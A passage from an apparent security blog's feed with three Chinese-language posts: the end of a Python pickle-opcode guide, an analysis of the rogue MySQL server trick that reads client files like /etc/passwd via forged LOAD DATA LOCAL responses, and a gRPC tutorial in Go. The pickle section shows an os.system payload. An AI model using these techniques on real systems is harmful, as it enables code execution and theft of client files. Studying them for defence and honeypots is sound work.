输入：module,callable,para 

OBJ
对应opcode：b'o'
建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：
OBJ(GLOBAL('os', 'system'), 'ls') 
输入：callable,para

xxx(xx,...)
对应opcode：b'R'
使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）

li[0]=321
或
globals_dic['local_var']='hello'
对应opcode：b's'
更新列表或字典的某项的值

xx.attr=123
对应opcode：b'b'
对xx对象进行属性设置

return
对应opcode：b'0'
出栈（作为pickle.loads函数的返回值）：
</code></pre><p>即可生成opcode。</p>
<p>参考：</p>
<ul>
<li><a href="https://xz.aliyun.com/t/7436">pickle反序列化初探</a></li>
<li><a href="https://xz.aliyun.com/t/7012#toc-0">通过AST来构造Pickle opcode</a></li>
<li><a href="https://github.com/eddieivan01/pker">pker</a></li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>When Mysql read your file</title>
			<link>https://theoyu.top/posts/mysql-read-file/</link>
			<pubDate>Sun, 08 Aug 2021 01:20:20 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/mysql-read-file/</guid>
			<description>这并不是一个新鲜的漏洞，准确的来说是炒冷饭，不过刚好学了计网，就来分析一下吧，顺便用go来重写一个简易蜜罐。
我们先看一看mysql客户端连接的这个过程，进行了怎样的通讯。
我们无需在意tcp的连接过程，所以直接过滤mysql协议即可。总的来说这里经历了5个过程。
 S➡C Server Greeting C➡S Login Request S➡C Response OK C➡SRequst Query S➡CRespose  当客户端连接上服务器，服务器就会发送Server Greeting这第一个握手数据包，这些数据的内容取决于服务器版本和服务器配置
0000 4a 00 00 00 0a 35 2e 35 2e 35 33 00 05 00 00 00 J....5.5.53.....0010 31 47 50 3d 22 31 6e 58 00 ff f7 21 02 00 0f 80 1GP=&amp;quot;1nX...!....0020 15 00 00 00 00 00 00 00 00 00 00 4d 5b 5e 48 2e .</description>
			<content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/08/20210808211512.png" alt=""></p>
<p>这并不是一个新鲜的漏洞，准确的来说是炒冷饭，不过刚好学了计网，就来分析一下吧，顺便用go来重写一个简易蜜罐。</p>
<p>我们先看一看mysql客户端连接的这个过程，进行了怎样的通讯。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/08/20210808200246.png" alt=""></p>
<p>我们无需在意tcp的连接过程，所以直接过滤mysql协议即可。总的来说这里经历了5个过程。</p>
<ol>
<li>S➡C <code>Server Greeting</code></li>
<li>C➡S <code>Login Request</code></li>
<li>S➡C <code>Response OK</code></li>
<li>C➡S<code>Requst Query</code></li>
<li>S➡C<code>Respose</code></li>
</ol>
<p>当客户端连接上服务器，服务器就会发送<strong>Server Greeting</strong>这第一个握手数据包，这些数据的内容取决于服务器版本和服务器配置</p>
<pre><code>0000   4a 00 00 00 0a 35 2e 35 2e 35 33 00 05 00 00 00   J....5.5.53.....
0010   31 47 50 3d 22 31 6e 58 00 ff f7 21 02 00 0f 80   1GP=&quot;1nX...!....
0020   15 00 00 00 00 00 00 00 00 00 00 4d 5b 5e 48 2e   ...........M[^H.
0030   49 67 4b 7e 5a 27 52 00 6d 79 73 71 6c 5f 6e 61   IgK~Z'R.mysql_na
0040   74 69 76 65 5f 70 61 73 73 77 6f 72 64 00         tive_password.
</code></pre><p>我们可以在<a href="https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake">MySQL官方文档</a>中探寻这一些数据所对应的含义，不过从蜜罐的角度，我们只要在接收连接时，原封不动把这个包发过去即可。</p>
<p>第二个包，也就是客户端的登陆包了，里面带着user信息和密码</p>
<pre><code>0000   50 00 00 01 *85* a6 ff 20 00 00 00 01 21 00 00 00   P...... ....!...
0010   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0020   00 00 00 00 72 6f 6f 74 00 14 2c 32 07 d2 b5 a0   ....root..,2....
0030   ff d5 6b 26 1f 09 83 5c 0e 4e 42 e5 da ce 6d 79   ..k&amp;...\.NB...my
0040   73 71 6c 5f 6e 61 74 69 76 65 5f 70 61 73 73 77   sql_native_passw
0050   6f 72 64 00                                       ord.
</code></pre><p>这个包本身没有什么好说的，但是我们重点看第五个字节：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/08/20210808200307.png" alt=""></p>
<p>这个flag为<strong>Can Use LOAD DATE LOCAL</strong>,value为1的话，表示允许客户端读取本地文件，关于这个我们后面再讨论。</p>
<p>第三个包也就是<code>Response OK</code>,原封不动照搬即可。</p>
<pre><code>0000   07 00 00 02 00 00 00 02 00 00 00                  ...........
</code></pre><p>第四个包是客户端的一个请求包，mysql连接后客户端会<strong>默认</strong>向服务端发起一个<code>select @@version</code>的请求来获取版本信息，第五个包也就是服务端返回的信息。</p>
<p>这样来看好像还没有走到漏洞点，现在通过<code>load data local</code>来看一看这个过程：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/08/20210808200321.png" alt=""></p>
<p>第一个包<strong>Request Query</strong>：<code>load data local infile &quot;/etc/passwd&quot; into table test;</code>也就是客户端发起的请求，意味把自己的<code>/etc/passwd</code>读取到test表中，而客户端是否有这个权限也就在于之前说的<strong>Can Use LOAD DATE LOCAL</strong>是否为1，其中<strong>windows和Linux</strong>默认为1，<strong>mac</strong>默认为0。</p>
<p>第二个包<strong>Response TABULAR</strong>是服务端的返回包,确认客户端应该发送的内容。</p>
<pre><code>0000   0c 00 00 01 fb 2f 65 74 63 2f 70 61 73 73 77 64   ...../etc/passwd
</code></pre><p>其中<code>00 00 01 fb</code>是初始头，fb后为文件。</p>
<p>第三个包是客户端返回的文件信息：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/08/20210808200334.png" alt=""></p>
<p>其中前4个字节是我们不需要的，前三个为数据长度，第四个为序列号。</p>
<p>第四个是服务端返回的确认信息，这个无所谓，因为数据已经拿到了。</p>
<p>看到这，你应该知道是怎么回事了，正是上面<strong>Response TABULAR</strong>这一过程，让服务端有了伪造文件读取的机会，官网也是这么表示这一过程：</p>
<blockquote>
<p>In theory, a patched server could be built that would tell the client  program to transfer a file of the server&rsquo;s choosing rather than the file named by the client in the LOAD DATA statement</p>
</blockquote>
<p>用lightless的表述也就是：</p>
<ul>
<li>客户端：hi~ 我将把我的 AAA文件给你插入到 test 表中！</li>
<li>服务端：OK，读取你本地的 BBB文件并发给我！</li>
<li>客户端：这是文件内容：balabal（BBB文件的内容）！</li>
</ul>
<p>并且，事实上并不是一定要客户端发起<strong>Load local file</strong>后服务端才能修改<strong>Response TABULAR</strong>，只要是客户端的<strong>Request Query</strong>,我们都可以发起<strong>Response TABULAR</strong>去进行文件读取，而正如最开始所说的，客户端连接后会发起一个<code>select @@version</code>,我们可以紧随以后构造请求。</p>
<p>代码请见→<a href="https://github.com/yuuuuu422/Go-Toys/tree/main/evil-mysql">github</a></p>
<p>防护：使用<code>--ssl-mode=VERIFY_IDENTITY</code>来建立可信的连接。但事实上作为蜜罐的话，大多扫描器为了效率并不会使用ssl。</p>
<p>参考：</p>
<ul>
<li><a href="https://lightless.me/archives/read-mysql-client-file.html">Read MySQL Client&rsquo;s File -lightless </a></li>
<li>[<a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/">MySQL connect file read</a>]</li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>Study rpc</title>
			<link>https://theoyu.top/posts/course/rpc/</link>
			<pubDate>Wed, 28 Jul 2021 10:26:13 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/course/rpc/</guid>
			<description>RPC  远程过程调用（英语：Remote Procedure Call，缩写为 RPC）是一个计算机通信协议。该协议允许运行于一台计算机的程序调用另一个地址空间（通常为一个开放网络的一台计算机）的子程序，而程序员就像调用本地程序一样，无需额外地为这个交互作用编程（无需关注细节）。RPC是一种服务器-客户端（Client/Server）模式，经典实现是一个通过发送请求-接受回应进行信息交互的系统。 – 远程过程调用 - Wikipedia.org
 简单来说，RPC就是一个CS模型。传统CS直接进行连接，像类似中断重连，重复请求，双向的信息交互都需要一个一个写操作。而一个好的RPC框架为我们提供了接口，只需要面向过程编程即可。
RPC流程：
从上图可以看出,rpc本身也是一种 request-response 协议。
有些实现扩展了远程调用的模型，实现了双向的服务调用，但是不管怎样，调用过程还是由一个客户端发起，服务器端提供响应，基本模型没有变化。
服务的调用过程为：
 client调用client stub，这是一次本地过程调用 client stub将参数打包成一个消息，然后发送这个消息。打包过程也叫做 marshalling(编码) client所在的系统将消息发送给server server的的系统将收到的包传给server stub server stub解包得到参数。 解包也被称作 unmarshalling(解码) 最后server stub调用服务过程. 返回结果按照相反的步骤传给client  golang自带的rpc框架也不错，不过更多的尝试还是放在了Google的开源跨语言rpc框架gRPC。
gRPC 在认识gRPC前需要先了解protobuf。
 gRPC uses Protocol Buffers, Google’s mature open source mechanism for serializing structured data (although it can be used with other data formats such as JSON). Here’s a quick intro to how it works.</description>
			<content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/07/20210727225352.gif" alt=""></p>
<h2 id="rpc">RPC</h2>
<blockquote>
<p>远程过程调用（英语：Remote Procedure Call，缩写为 RPC）是一个计算机通信协议。该协议允许运行于一台计算机的程序调用另一个地址空间（通常为一个开放网络的一台计算机）的子程序，而程序员就像调用本地程序一样，无需额外地为这个交互作用编程（无需关注细节）。RPC是一种服务器-客户端（Client/Server）模式，经典实现是一个通过发送请求-接受回应进行信息交互的系统。
– <a href="https://zh.wikipedia.org/wiki/%E9%81%A0%E7%A8%8B%E9%81%8E%E7%A8%8B%E8%AA%BF%E7%94%A8">远程过程调用 - Wikipedia.org</a></p>
</blockquote>
<p>简单来说，RPC就是一个CS模型。传统CS直接进行连接，像类似中断重连，重复请求，双向的信息交互都需要一个一个写操作。而一个好的RPC框架为我们提供了接口，只需要面向过程编程即可。</p>
<p>RPC流程：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/07/20210729210606.png" alt=""></p>
<p>从上图可以看出,rpc本身也是一种 request-response 协议。</p>
<p>有些实现扩展了远程调用的模型，实现了双向的服务调用，但是不管怎样，调用过程还是由一个客户端发起，服务器端提供响应，基本模型没有变化。</p>
<p>服务的调用过程为：</p>
<ol>
<li>client调用client stub，这是一次本地过程调用</li>
<li>client stub将参数打包成一个消息，然后发送这个消息。打包过程也叫做 marshalling(编码)</li>
<li>client所在的系统将消息发送给server</li>
<li>server的的系统将收到的包传给server stub</li>
<li>server stub解包得到参数。 解包也被称作 unmarshalling(解码)</li>
<li>最后server stub调用服务过程. 返回结果按照相反的步骤传给client</li>
</ol>
<p>golang自带的rpc框架也不错，不过更多的尝试还是放在了Google的开源跨语言rpc框架gRPC。</p>
<h2 id="grpc">gRPC</h2>
<p>在认识gRPC前需要先了解protobuf。</p>
<blockquote>
<p>gRPC uses <a href="https://developers.google.com/protocol-buffers/docs/overview">Protocol Buffers</a>, Google’s mature open source mechanism for serializing structured data (although it can be used with other data formats such as JSON). Here’s a quick intro to how it works. If you’re already familiar with protocol buffers, feel free to skip ahead to the next section.</p>
<p>The first step when working with protocol buffers is to define the structure for the data you want to serialize in a <em>proto file</em>: this is an ordinary text file with a <code>.proto</code> extension. Protocol buffer data is structured as <em>messages</em>, where each message is a small logical record of information containing a series of name-value pairs called <em>fields</em>.</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/07/20210729210616.png" alt=""></p>
<p>使用protobuf需要预先下载<a href="https://github.com/google/protobuf/releases">protoc</a>二进制文件以及转化为go的<a href="https://github.com/golang/protobuf/protoc-gen-go">插件</a>，下面以一个栗子说明。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">├── client
│   └── main.go
├── pb
│   └── hello.proto
└── server
    └── main.go
</code></pre></div><h3 id="编写proto">编写proto</h3>
<h4 id="定义service">定义service</h4>
<p>如果想要将消息类型用在RPC系统中，可以在.proto文件中定义一个RPC服务接口，protobuf编译器会根据所选择的不同语言生成服务接口代码</p>
<p>例如，想要定义一个RPC服务并具有一个方法，该方法接收HelloRequest并返回一个HelloReply，此时可以在.proto文件中进行如下定义：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-protobuf" data-lang="protobuf"><span class="kd">service</span> <span class="n">Greeter</span> <span class="p">{</span><span class="err">
</span><span class="err"></span>    <span class="c1">// SayHello 方法
</span><span class="c1"></span>    <span class="k">rpc</span> <span class="n">SayHello</span> <span class="p">(</span><span class="n">HelloRequest</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="n">HelloReply</span><span class="p">)</span> <span class="p">{}</span><span class="err">
</span><span class="err"></span><span class="p">}</span><span class="err">
</span></code></pre></div><h4 id="定义message">定义message</h4>
<p>上述方法中，传入的Request以及返回的Reply都属于message，一个message类型定义描述了一个请求或响应的消息格式，可以包含多种类型字段，在转化为go后message相当于一个结构体。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-protobuf" data-lang="protobuf"><span class="kd">message</span> <span class="nc">HelloRequest</span> <span class="p">{</span><span class="err">
</span><span class="err"></span>    <span class="kt">string</span> <span class="n">name</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span><span class="err">
</span><span class="err"></span><span class="p">}</span><span class="err">
</span><span class="err">
</span><span class="err">
</span><span class="err"></span><span class="c1">// 包含问候语的响应消息
</span><span class="c1"></span><span class="kd">message</span> <span class="nc">HelloReply</span> <span class="p">{</span><span class="err">
</span><span class="err"></span>    <span class="kt">string</span> <span class="kd">message</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span><span class="err">
</span><span class="err"></span><span class="p">}</span><span class="err">
</span></code></pre></div><h4 id="总代码">总代码</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-protobuf" data-lang="protobuf"><span class="n">syntax</span> <span class="o">=</span> <span class="s">&#34;proto3&#34;</span><span class="p">;</span> <span class="c1">// 版本声明，使用Protocol Buffers v3版本
</span><span class="c1"></span><span class="err">
</span><span class="err"></span><span class="k">option</span> <span class="n">go_package</span><span class="o">=</span><span class="s">&#34;.&#34;</span><span class="p">;</span><span class="err">
</span><span class="err">
</span><span class="err"></span><span class="kn">package</span> <span class="nn">pb</span><span class="p">;</span> <span class="c1">// 包名
</span><span class="c1"></span><span class="err">
</span><span class="err">
</span><span class="err"></span><span class="c1">// 定义一个打招呼服务
</span><span class="c1"></span><span class="kd">service</span> <span class="n">Greeter</span> <span class="p">{</span><span class="err">
</span><span class="err"></span>    <span class="c1">// SayHello 方法
</span><span class="c1"></span>    <span class="k">rpc</span> <span class="n">SayHello</span> <span class="p">(</span><span class="n">HelloRequest</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="n">HelloReply</span><span class="p">)</span> <span class="p">{}</span><span class="err">
</span><span class="err"></span><span class="p">}</span><span class="err">
</span><span class="err">
</span><span class="err"></span><span class="c1">// 包含人名的一个请求消息
</span><span class="c1"></span><span class="kd">message</span> <span class="nc">HelloRequest</span> <span class="p">{</span><span class="err">
</span><span class="err"></span>    <span class="kt">string</span> <span class="n">name</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span><span class="err">
</span><span class="err"></span><span class="p">}</span><span class="err">
</span><span class="err">
</span><span class="err">
</span><span class="err"></span><span class="c1">// 包含问候语的响应消息
</span><span class="c1"></span><span class="kd">message</span> <span class="nc">HelloReply</span> <span class="p">{</span><span class="err">
</span><span class="err"></span>    <span class="kt">string</span> <span class="kd">message</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span><span class="err">
</span><span class="err"></span><span class="p">}</span><span class="err">
</span></code></pre></div><h4 id="编译">编译</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">pb/
$ protoc --go_out<span class="o">=</span><span class="nv">plugins</span><span class="o">=</span>grpc:. hello.proto
</code></pre></div><p>在当前目录生成了<code>hello.pb.go</code></p>
<h3 id="编写server端">编写server端</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
	<span class="s">&#34;fmt&#34;</span>
	<span class="s">&#34;net&#34;</span>

	<span class="nx">pb</span> <span class="s">&#34;rpc-demo/hello/pb&#34;</span>

	<span class="s">&#34;golang.org/x/net/context&#34;</span>
	<span class="s">&#34;google.golang.org/grpc&#34;</span>
<span class="p">)</span>

<span class="kd">type</span> <span class="nx">server</span> <span class="kd">struct</span><span class="p">{}</span>

<span class="kd">func</span> <span class="p">(</span><span class="nx">s</span> <span class="o">*</span><span class="nx">server</span><span class="p">)</span> <span class="nf">SayHello</span><span class="p">(</span><span class="nx">ctx</span> <span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">in</span> <span class="o">*</span><span class="nx">pb</span><span class="p">.</span><span class="nx">HelloRequest</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="nx">pb</span><span class="p">.</span><span class="nx">HelloReply</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">return</span> <span class="o">&amp;</span><span class="nx">pb</span><span class="p">.</span><span class="nx">HelloReply</span><span class="p">{</span><span class="nx">Message</span><span class="p">:</span> <span class="s">&#34;Hello &#34;</span> <span class="o">+</span> <span class="nx">in</span><span class="p">.</span><span class="nx">Name</span><span class="p">},</span> <span class="kc">nil</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="c1">// 监听本地的20022端口
</span><span class="c1"></span>	<span class="nx">conn</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">net</span><span class="p">.</span><span class="nf">Listen</span><span class="p">(</span><span class="s">&#34;tcp&#34;</span><span class="p">,</span> <span class="s">&#34;:20022&#34;</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;failed to listen: %v&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
		<span class="k">return</span>
	<span class="p">}</span>
	<span class="nx">s</span> <span class="o">:=</span> <span class="nx">grpc</span><span class="p">.</span><span class="nf">NewServer</span><span class="p">()</span>                  <span class="c1">// 创建gRPC服务器
</span><span class="c1"></span>	<span class="nx">pb</span><span class="p">.</span><span class="nf">RegisterGreeterServer</span><span class="p">(</span><span class="nx">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">server</span><span class="p">{})</span> <span class="c1">// 在gRPC服务端注册服务
</span><span class="c1"></span>

	<span class="nx">err</span> <span class="p">=</span> <span class="nx">s</span><span class="p">.</span><span class="nf">Serve</span><span class="p">(</span><span class="nx">conn</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;failed to serve: %v&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
		<span class="k">return</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>和传统cs模型没有很大差别，只是多了一个gRPC服务注册。</p>
<h3 id="编写client">编写client</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
	<span class="s">&#34;context&#34;</span>
	<span class="s">&#34;fmt&#34;</span>

	<span class="nx">pb</span> <span class="s">&#34;rpc-demo/hello/pb&#34;</span>

	<span class="s">&#34;google.golang.org/grpc&#34;</span>
<span class="p">)</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="c1">// 连接服务器
</span><span class="c1"></span>	<span class="nx">conn</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">grpc</span><span class="p">.</span><span class="nf">Dial</span><span class="p">(</span><span class="s">&#34;127.0.0.1:20022&#34;</span><span class="p">,</span> <span class="nx">grpc</span><span class="p">.</span><span class="nf">WithInsecure</span><span class="p">())</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;faild to connect: %v&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="k">defer</span> <span class="nx">conn</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>

	<span class="nx">c</span> <span class="o">:=</span> <span class="nx">pb</span><span class="p">.</span><span class="nf">NewGreeterClient</span><span class="p">(</span><span class="nx">conn</span><span class="p">)</span>
	<span class="c1">// 调用服务端的SayHello
</span><span class="c1"></span>	<span class="nx">r</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">SayHello</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">(),</span> <span class="o">&amp;</span><span class="nx">pb</span><span class="p">.</span><span class="nx">HelloRequest</span><span class="p">{</span><span class="nx">Name</span><span class="p">:</span> <span class="s">&#34;Theoyu&#34;</span><span class="p">})</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;could not greet: %v&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;Greeting: %s !\n&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">Message</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div><p>这里grpc.dial用到了<code>grpc.WithInsecure()</code>，可以用credentials去指定tls认证。</p>
<h3 id="认证">认证</h3>
<p>认证分tls和token两种，tls就不过多阐述，这里在上面case的基础上加一个token认证。grpc的token认证主要放在客户端，服务器相当于只是在service里对client传来的metadata进行一个验证。</p>
<h4 id="client">Client</h4>
<p>首先看上个栗子中的<code>grpc.WithInsecure()</code>,这里传入的是一个<code>DialOption</code>,实际上gRPC支持我们去自定义一个<strong>Credential</strong>，我们看一下<code> WithPerRPCCredentials()</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">WithPerRPCCredentials</span><span class="p">(</span><span class="nx">creds</span> <span class="nx">credentials</span><span class="p">.</span><span class="nx">PerRPCCredentials</span><span class="p">)</span> <span class="nx">DialOption</span> <span class="p">{</span>
	<span class="k">return</span> <span class="nf">newFuncDialOption</span><span class="p">(</span><span class="kd">func</span><span class="p">(</span><span class="nx">o</span> <span class="o">*</span><span class="nx">dialOptions</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">o</span><span class="p">.</span><span class="nx">copts</span><span class="p">.</span><span class="nx">PerRPCCredentials</span> <span class="p">=</span> <span class="nb">append</span><span class="p">(</span><span class="nx">o</span><span class="p">.</span><span class="nx">copts</span><span class="p">.</span><span class="nx">PerRPCCredentials</span><span class="p">,</span> <span class="nx">creds</span><span class="p">)</span>
	<span class="p">})</span>
<span class="p">}</span>
</code></pre></div><p>这里要求我们传入一个<code>credentials.PerRPCCredentials</code>,跟进看一看：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">type</span> <span class="nx">PerRPCCredentials</span> <span class="kd">interface</span> <span class="p">{</span>
	<span class="c1">// GetRequestMetadata gets the current request metadata, refreshing
</span><span class="c1"></span>	<span class="c1">// tokens if required. This should be called by the transport layer on
</span><span class="c1"></span>	<span class="c1">// each request, and the data should be populated in headers or other
</span><span class="c1"></span>	<span class="c1">// context. If a status code is returned, it will be used as the status
</span><span class="c1"></span>	<span class="c1">// for the RPC. uri is the URI of the entry point for the request.
</span><span class="c1"></span>	<span class="c1">// When supported by the underlying implementation, ctx can be used for
</span><span class="c1"></span>	<span class="c1">// timeout and cancellation. Additionally, RequestInfo data will be
</span><span class="c1"></span>	<span class="c1">// available via ctx to this call.
</span><span class="c1"></span>	<span class="c1">// TODO(zhaoq): Define the set of the qualified keys instead of leaving
</span><span class="c1"></span>	<span class="c1">// it as an arbitrary string.
</span><span class="c1"></span>	<span class="nf">GetRequestMetadata</span><span class="p">(</span><span class="nx">ctx</span> <span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">uri</span> <span class="o">...</span><span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span>
	<span class="c1">// RequireTransportSecurity indicates whether the credentials requires
</span><span class="c1"></span>	<span class="c1">// transport security.
</span><span class="c1"></span>	<span class="nf">RequireTransportSecurity</span><span class="p">()</span> <span class="kt">bool</span>
<span class="p">}</span>
</code></pre></div><p>上面的<code>GetRequestMetadata()</code>也就是我们传入的token，服务端可以对其进行验证，<code>RequireTransportSecurity()</code>为tls设立，这里设置为false。</p>
<pre><code class="language-{go" data-lang="{go">type customCredential struct{}



func (c customCredential) GetRequestMetadata(ctx context.Context,uri ...string) (map[string]string, error){
	return map[string]string{
		&quot;id&quot;: &quot;666666&quot;,
		&quot;key&quot;: &quot;hack&quot;,
	},nil
}

// RequireTransportSecurity 自定义认证是否开启TLS
func (c customCredential) RequireTransportSecurity() bool {
    return true
}

func main(){
    ......
    var opts []grpc.DialOption

	opts=append(opts, grpc.WithInsecure())

	opts=append(opts, grpc.WithPerRPCCredentials(new(customCredential)))

	// 连接服务器
	conn, err := grpc.Dial(&quot;:20022&quot;, opts...)
    ......
    
}
</code></pre><h4 id="server">Server</h4>
<p>Server只需重新改写<code>Sayhello</code>方法即可</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="o">......</span>
<span class="kd">func</span> <span class="p">(</span><span class="nx">s</span> <span class="o">*</span><span class="nx">server</span><span class="p">)</span> <span class="nf">SayHello</span><span class="p">(</span><span class="nx">ctx</span> <span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span><span class="nx">req</span> <span class="o">*</span><span class="nx">pb</span><span class="p">.</span><span class="nx">HelloRequest</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="nx">pb</span><span class="p">.</span><span class="nx">HelloReply</span><span class="p">,</span><span class="kt">error</span><span class="p">){</span>
	
	<span class="nx">md</span><span class="p">,</span><span class="nx">ok</span><span class="o">:=</span><span class="nx">metadata</span><span class="p">.</span><span class="nf">FromIncomingContext</span><span class="p">(</span><span class="nx">ctx</span><span class="p">)</span>

	<span class="k">if</span> <span class="p">!</span><span class="nx">ok</span><span class="p">{</span>
		<span class="k">return</span> <span class="kc">nil</span><span class="p">,</span><span class="nx">status</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="nx">codes</span><span class="p">.</span><span class="nx">Unauthenticated</span><span class="p">,</span><span class="s">&#34;No token&#34;</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="kd">var</span> <span class="p">(</span>
        <span class="nx">id</span>  <span class="kt">string</span>
        <span class="nx">key</span> <span class="kt">string</span>
    <span class="p">)</span>

    <span class="k">if</span> <span class="nx">val</span><span class="p">,</span> <span class="nx">ok</span> <span class="o">:=</span> <span class="nx">md</span><span class="p">[</span><span class="s">&#34;id&#34;</span><span class="p">];</span> <span class="nx">ok</span> <span class="p">{</span>
        <span class="nx">id</span> <span class="p">=</span> <span class="nx">val</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="nx">val</span><span class="p">,</span> <span class="nx">ok</span> <span class="o">:=</span> <span class="nx">md</span><span class="p">[</span><span class="s">&#34;key&#34;</span><span class="p">];</span> <span class="nx">ok</span> <span class="p">{</span>
        <span class="nx">key</span> <span class="p">=</span> <span class="nx">val</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="p">}</span>
	<span class="k">if</span> <span class="nx">key</span> <span class="o">!=</span> <span class="s">&#34;password&#34;</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">grpc</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="nx">codes</span><span class="p">.</span><span class="nx">Unauthenticated</span><span class="p">,</span> <span class="s">&#34;Token认证信息无效: id=%s, key=%s&#34;</span><span class="p">,</span> <span class="nx">id</span><span class="p">,</span> <span class="nx">key</span><span class="p">)</span>
    <span class="p">}</span>

	<span class="k">return</span> <span class="o">&amp;</span><span class="nx">pb</span><span class="p">.</span><span class="nx">HelloReply</span><span class="p">{</span><span class="nx">Message</span><span class="p">:</span> <span class="s">&#34;Hello&#34;</span><span class="o">+</span><span class="nx">req</span><span class="p">.</span><span class="nx">Name</span><span class="p">},</span><span class="kc">nil</span>
<span class="p">}</span>
<span class="o">......</span>
</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ go run main.go 
